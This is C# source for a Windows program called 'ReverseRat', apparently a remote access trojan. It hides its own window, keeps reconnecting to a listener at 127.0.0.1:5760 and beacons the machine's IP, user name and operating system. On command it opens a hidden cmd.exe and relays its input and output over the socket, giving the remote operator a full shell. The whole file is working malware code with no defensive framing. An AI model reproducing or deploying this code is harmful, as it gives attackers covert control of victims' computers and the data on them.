//
// Reverse Portbinding Shell Server - by Paul Chin
// Aug 26, 2007
//
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;            //for Streams
using System.Diagnostics;   //for Process
using System.Net;
using System.Text.RegularExpressions;
using System.Threading;

namespace ReverseRat
{

   
    public partial class Form1 : Form
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;
        Funciones LlamaFuncion = new Funciones();
        string MutexApp = "";
        private bool shell = false;

        public Form1()
        {
            bool createdNew;

            MutexApp = LlamaFuncion.RandomString(10);  // Mutex de la aplicacion        
            Mutex m = new Mutex( true, MutexApp, out createdNew );          
            if( !createdNew )
            {
                // Instance already running; exit.
                MessageBox.Show(@"Exiting: Instance already running" );
                Environment.Exit(0);
            }
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            for (;;)
            {               
                RunServer();
                System.Threading.Thread.Sleep(2000); //Wait 2 seconds
            }                                        //then try again
        }

     
        private void RunServer()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();
     
            if (!tcpClient.Connected)
            {
                try
                {                   
                    tcpClient.Connect("127.0.0.1", 5760);
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception err)  // No hay cliente, regresa
                { 
                    return; 
                }
                EnviaDatos("M1X3R|" + LlamaFuncion.ObtenerIP() + "|" + LlamaFuncion.ObtenPCUser() + "|"+ LlamaFuncion.TipoSistemaOperativo() + "|"  + MutexApp);
             
            }

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("exit") >= 0) shell = false;
                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer(); // Cierra servidor
                    if (strInput.ToString().LastIndexOf("quit") >= 0) throw new ArgumentException();
                    if (strInput.ToString().LastIndexOf("hola") >= 0) LlamaFuncion.Hola();
                    if (strInput.ToString().LastIndexOf("prueba") >= 0) EnviaDatos("PRUEBA DE ENVIO DE DATOS" + "|" + Funciones.HashServer + "|");
                    if (strInput.ToString().LastIndexOf("asignahash") >= 0)
                    {
                        LlamaFuncion.AgregaHash(strInput.ToString().Split(' ')[1].Trim());
                    }
                    if (strInput.ToString().LastIndexOf("shell") >= 0)
                    {
                        shell = true;
                        processCmd = new Process();
                        processCmd.StartInfo.FileName = "cmd.exe";
                        processCmd.StartInfo.CreateNoWindow = true;
                        processCmd.StartInfo.UseShellExecute = false;
                        processCmd.StartInfo.RedirectStandardOutput = true;
                        processCmd.StartInfo.RedirectStandardInput = true;
                        processCmd.StartInfo.RedirectStandardError = true;
                        processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        processCmd.Start();
                        processCmd.BeginOutputReadLine();                       
                    }
                     
                    if (shell)
                    {                    
                        processCmd.StandardInput.WriteLine(strInput);                       
                    }
                   // MessageBox.Show(strInput.ToString());
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception err)
                {
                    Console.WriteLine(err.Message);
                    Cleanup();
                    break;
                }
            }            
        }


        private void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception err) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }

        private void StopServer() // Comando para salir del servidor (cerrar aplicación)
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data + "|" + Funciones.HashServer + "|");
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

        private void EnviaDatos(String Cadena)
        {
            streamWriter.WriteLine(Cadena);
            streamWriter.Flush();
        }


        private void Form1_Load(object sender, EventArgs e)
        {

        }
    }
}